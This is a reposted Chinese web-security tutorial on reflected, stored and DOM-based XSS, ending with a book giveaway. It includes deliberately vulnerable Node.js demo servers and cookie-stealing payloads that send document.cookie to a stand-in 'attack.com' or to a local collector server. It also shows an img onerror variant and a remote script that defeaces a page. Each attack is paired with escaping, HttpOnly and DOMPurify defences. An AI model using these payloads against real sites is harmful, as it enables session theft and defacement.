> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_2WeheJfK8ao3HrI4TXa8w)

> 授权转载自：乔珂力 
> 
> https://juejin.im/post/6867184627393265677

之前写过两篇文章分别介绍了 Cookie ：https://juejin.im/post/6863377752939036679 和 JSON Web Token：https://juejin.im/post/6854573220457086984，很多网站会在用户登录完毕设置 Cookie 值或者返回一个 Token，这就相当于令牌，只要拿着这张令牌就等同于证明了你是某个用户。如果防御不到位，Cookie 和 Token 很容易被 XSS 攻击窃取到，此时攻击者就可以冒充真实的用户，在网站中为所欲为了。

XSS 的全称叫跨站脚本攻击（Cross Site Scripting），攻击出现的原因一般是因为 Web 程序对用户的输入过滤不足导致的一种漏洞，攻击者可以把恶意的脚本代码注入到网页之中，当其他用户浏览时就会执行其中的恶意代码，对受害者产生各种攻击。XSS 一般分为三种类型：

*   反射型
    
*   存储型
    
*   DOM 型
    

反射型 XSS 攻防实战
------------

反射型 XSS 攻击的恶意脚本并没有被存储到后端数据库中，而是诱导用户点击某个精心拼接的恶意链接，从而达到攻击的目的。

### 攻击案例

一个常见的场景是用户在某电影网站搜索，假如请求地址是：

```
https://xxx.com/movies?q=功夫熊猫
```

在后台返回的结果页中，会显示用户搜索的电影名：

```
「功夫熊猫」的搜索结果为：
xxxxxxxxxxxxxxxxxxxxxxx
```

攻击者拼接了一个极度恶意的链接：

```
https://xxx.com/movies?q=功夫熊猫<script>fetch(`https://attack.com?cookie=${document.cookie}`)</script>
```

如果用户点击了这个恶意链接，cookie 立马被盗。下面给出 `Node.js` 后端服务完整源码：

```
const http = require('http')const URL = require('url')// HTML 模板function renderHTML(tpl) {  return `<!DOCTYPE html><html><head><meta charset="UTF-8"/></head><body>${tpl}</body></html>`}// 路由分发器const routes = {  'GET /movies': (req, res) => { // 被攻击网站的电影搜索接口    const tpl = req.query.q      ? `<h3>「${req.query.q}」的搜索结果为：</h3>${Array(30).fill('x')}`      : `请输入搜索的电影`    res.setHeader('Set-Cookie', ['name=keliq', 'age=10'])    res.end(renderHTML(tpl))  },  'GET /cookies': (req, res) => { // 攻击者后台收集cookie的接口    console.log(req.query)    res.end()  },}function onRequest(req, res) {  const { url, method } = req  const { query, pathname } = URL.parse(url, true) // 解析 url  Object.assign(req, { query, path: pathname }) // 并把 query 和 pathname 参数扩展到 req 对象  const route = routes[[method, pathname].join(' ')] // 获取路由处理函数（策略模式）  if (route) return route(req, res)  res.statusCode = 404  res.end('Not Found')}http.createServer(onRequest).listen(3000) // 被攻击的网站http.createServer(onRequest).listen(4000) // 攻击者收集cookie的服务器
```

运行上面的代码，然后打开访问下面的恶意链接：

```
http://localhost:3000/movies?q=功夫熊猫<script>fetch(`http://localhost:4000/cookies?cookie=${document.cookie}`)</script>
```

可以看到，用户的 Cookie 被发送到了攻击者的服务器。

### 防御方案

造成反射型 XSS 攻击的原因就是服务端没过滤，所以解决方案也很简单，就是在服务器对用户输入进行过滤，过滤方案一般有很多，例如直接用 `encodeURIComponent` 对查询参数进行过滤：

```
const tpl = req.query.q  ? `<h3>「${encodeURIComponent(req.query.q)}」的搜索结果为：</h3>${Array(30).fill('x')}`  : `请输入搜索的电影`
```

还有一种方式是写一个函数替换掉那些 `<`、`&` 等特殊字符：

```
function encodeHTML(str) {  return str  .replace(/&/g,'&')  .replace(/"/g,'"')  .replace(/'/g,''')  .replace(/</g,'<')  .replace(/>/g,'>')}
```

另外，如果后端登录验证是基于 Cookie 的话，一定要设置其属性为 HttpOnly，这样攻击者无法利用 JS 脚本获取到 Cookie 了。

存储型 XSS 攻防实战
------------

与反射型不同，存储型 XSS 攻击是指当用户的输入包含了恶意脚本，服务端转义就存储到数据库，访问页面会触发恶意脚本执行，而导致的攻击。

### 攻击案例

假如在某网站上有一篇爆款文章：

```
https://xxx.com/articles/1
```

攻击者在文章下面发表了一篇评论，内容中包含了 script 脚本：

```
文章写的真棒！<script>fetch(`http://localhost:4000/cookies?cookie=${document.cookie}`)</script>
```

如果服务端直接把评论字符串保存到数据库了，下次只要有用户访问该文章时，包含恶意脚本的评论内容被返回，把当前用户的 cookie 发送到攻击者的服务器！下面是完整的 `Node.js` 服务端源码：

```
const http = require('http')const URL = require('url')const qs = require('querystring')// 模拟文章数据库const article = {  id: 1,  title: '体育新闻',  content:    '火箭在对阵雷霆首轮系列赛的第5场比赛中以114-80战胜对手，但在这场比赛中更受关注的还是丹尼斯-施罗德和PJ塔克之间的冲突导致两人都被驱逐，当然，在这场比赛之后火箭已经手握3-2的领先优势。',  comments: ['评论1', '评论2'],}// HTML 模板function renderHTML(tpl) {  return `<!DOCTYPE html><html><head><meta charset="UTF-8"/></head><body>${tpl}</body></html>`}// 路由分发器const routes = {  'GET /articles/1': (req, res) => {    const tpl = `    <div style="width: 500px;margin: auto;">      <h1>${article.title}</h1>      <p>${article.content}</p>      <h3>评论区</h3>      <ul>${article.comments        .map((item) => '<li>' + item + '</li>')        .join('')}</ul>      <hr/>      <p>请发表您的评论：</p>      <form action="/comments" method="post">        <textarea lines="3" maxlength="1000" >提交</button>      </form>    </div>    `    res.setHeader('Set-Cookie', ['name=keliq', 'age=10'])    res.end(renderHTML(tpl))  },  'POST /comments': async (req, res) => {    let body = await getBody(req)    let { comment = '' } = qs.parse(body)    comment = comment.trim()    if (comment) { // 为防止内存溢出，只保留最新10条评论      article.comments = [comment, ...article.comments.slice(0, 9)]    }    res.writeHead(301, { Location: '/articles/1' })    res.end()  },  'GET /cookies': (req, res) => {    console.log(req.query)    res.end()  },  'GET /malicious.js': (req, res) => {    const script = `document.body.innerHTML = '美女荷棺在线發牌<img width=200 src="http://img.zlib.cn/beauty/1.jpg" />'`    res.end(script)  },}// 获取 req.bodyfunction getBody(req) {  return new Promise((resolve, reject) => {    const arr = []    req      .on('data', (data) => arr.push(data))      .on('end', () =>resolve(decodeURIComponent(Buffer.concat(arr).toString())))      .on('error', reject)  })}function onRequest(req, res) {  const { url, method } = req  const { query, pathname } = URL.parse(url, true) // 解析 url  Object.assign(req, { query, path: pathname }) // 并把 query 和 pathname 参数扩展到 req 对象  const route = routes[[method, pathname].join(' ')] // 获取路由处理函数（策略模式）  if (route) return route(req, res)  res.statusCode = 404  res.end('Not Found')}http.createServer(onRequest).listen(3000) // 被攻击的网站http.createServer(onRequest).listen(4000) // 攻击者收集cookie的服务器
```

运行上面的代码，然后打开网站 `http://localhost:3000/articles/1`，发表一则评论：

```
文章写的真棒！<script>fetch(`http://localhost:4000/cookies?cookie=${document.cookie}`)</script>
```

可以看到，用户的 Cookie 马上被发送到了攻击者的服务器。其实这种获取 Cookie 的方式还算小打小闹了，只要能够利用 xss 注入 script，黑客真的是可以「为所欲为」，例如黑客通过操作 DOM 的方式，分分钟把你的网站变成赌博网站、色情网站...，不信的话你输入下面的评论试试（内含福利）：

```
文章写的真棒！<script src="http://localhost:4000/malicious.js"></script>
```

在这个恶意脚本 `malicious.js` 里面，直接改掉了 body，想想看，所有访问你的网站的用户，看到的其实是另外一番景象，太吓人了。

### 防御方案

可以看到，存储型 XSS 也是因为恶意代码未经转义直接被插入到响应的 HTML 里的，然后被浏览器执行导致攻击，所以解决方案也是对用户输入进行过滤，过滤方案与上面讲的反射型一致，可以根据需要选择过滤时机，例如：

*   客户端提交前进行校验过滤，如果包含恶意脚本则不提交，或者提交转义后的字符串
    
*   服务端接收后先校验过滤，如果包含恶意脚本则不存储到数据库，或者存储转义后的字符串
    
*   客户端渲染时候进行过滤，即使数据库中存储了未经转义的恶意脚本，输出转义后的字符串
    

DOM 型 XSS 攻防实战
--------------

DOM 型 XSS 与反射型或存储型 XSS 的区别在于，DOM 型在服务器返回的网页或脚本中是看不到恶意代码的，而是在更新 DOM 树的时候触发了恶意脚本的执行。

### 攻击案例

我们来看一则模拟案例，前端开发人员未经过滤就直接把用户输入插入到 HTML 中：

```
<input id="input" type="text" /><button onclick="container.innerHTML = input.value">点击</button><p id="container"></p>
```

试想一下，如果此时用户输入了下面一段恶意脚本的话会发生什么？

```
<script>fetch(`https://attack.com?cookie=${document.cookie}`)</script>
```

值得庆幸的是，大部分现代浏览器都实现了 HTML5 的安全规范：

> 不执行由 innerHTML 插入的 script 标签。

但是这就足够安全了吗？非也，请看下面的输入：

```
<img src="x" onerror="fetch(`http://localhost:4000/cookies?cookie=${document.cookie}`)">
```

恶意脚本依然在 onerror 回调中被触发了！

### 防御方案

这里推荐使用 DOMPurify 库对用户的输入进行过滤，然后再使用 innerHTML 插入到 DOM 中。

总结
--

反射型 XSS 攻击的手段就是诱导用户点击，这种攻击是一次性的，用户点击就中招，不点就没事，危害性不如存储型的大，但是小白用户很容易被盗号。

存储型 XSS 攻击范围广，受害面积大，且不容易及时发现和排查，一定要多加小心，对于用户输入的任何内容都不要完全信任，对于动态渲染的文本一定要进行转义。

DOM 型 XSS 攻击随着单页面应用普及和流行愈发常见，因为在单页面应用中 JS 经常操作 DOM，而 DOM 型 XSS 攻击就是利用了浏览器解析机制，因此很容易触发 DOM 型 XSS 攻击。不过好在大部分前端框架，例如 Vue、Angular 都内置 DOM 型 XSS 攻击的防御机制。

> 源码：`git clone git@github.com:keliq/web-attack-defense.git`

最后
--

瓶子君免费包邮送书啦！

本书通俗易懂，图文并茂，提供完整的商业项目开发流程，对于拥有 `Node.js` 基础而缺乏实战经验的开发人员来说非常适合。 

  

  

抽奖活动规则

**奖品设置：**《Node.js+Express+Vue.js 项目开发实战》 5 本

**开奖时间：9** 月 11 日 晚上 21：00

**开奖说明：**中奖后请把中奖 ID 截图后发给我

  

  

参与方式

公众号内，回复 “抽奖”，自动弹出「高级前端面试」小程序图片，长按图片进入抽奖页面，点击参与即可，可邀请好友助力获得更多机会，排行榜的第一名、第二名必中奖，其余三本按排行榜权重随机抽取。

正式开奖后，中奖的读者会收到通知，到时，请中奖的读者把中奖 ID 截图后发给我，我会在近期将礼物寄送给您。

![](https://mmbiz.qpic.cn/mmbiz/ianq03UUWGmKcoRiaRFUGwEKsUmhNrlib04uWUtZNcQxqTZw0ichk6ZEr90ib0e0RRWmIPOYvUaQib4Xqs8bHdibrCUlQ/640?wx_fmt=gif)